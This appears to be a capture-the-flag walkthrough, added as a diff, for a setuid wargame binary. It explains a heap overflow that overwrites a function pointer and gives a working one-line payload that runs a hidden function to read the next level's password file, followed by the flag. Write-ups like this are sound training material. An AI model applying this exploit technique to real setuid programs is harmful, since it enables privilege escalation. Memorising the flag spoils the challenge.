@@ -1,0 +1,49 @@
+# Level6 Walkthrough
+
+Binary is setuid `level7`.
+
+```c
+void n(void) {
+  system("/bin/cat /home/user/level7/.pass");
+}
+
+void m(void) {
+  puts("Nope");
+}
+
+int main(int argc, char **argv) {
+  char *buffer       = malloc(64);
+  void (**funcptr)() = malloc(4);
+
+  *funcptr = m;
+  strcpy(buffer, argv[1]);
+  (*funcptr)();
+}
+```
+
+## Vulnerability
+
+Two consecutive `malloc` put the 64-byte buffer and the 4-byte function pointer
+next to each other on the heap. `strcpy(buffer, argv[1])` has no bounds check, so a
+long `argv[1]` overflows the buffer into the adjacent chunk and overwrites the
+function pointer. `(*funcptr)()` then calls whatever it was overwritten with.
+
+`n` runs `system("/bin/cat /home/user/level7/.pass")` but is never called normally
+(the pointer defaults to `m`, which prints "Nope").
+
+## Exploitation
+
+- Address of `n`: `0x08048454` -> the value to write.
+- Offset: 72 bytes (first chunk is 64 requested + allocation header).
+
+Overwrite the function pointer with `n` so `(*funcptr)()` calls it.
+
+```sh
+./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+```
+
+Flag:
+
+```txt
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
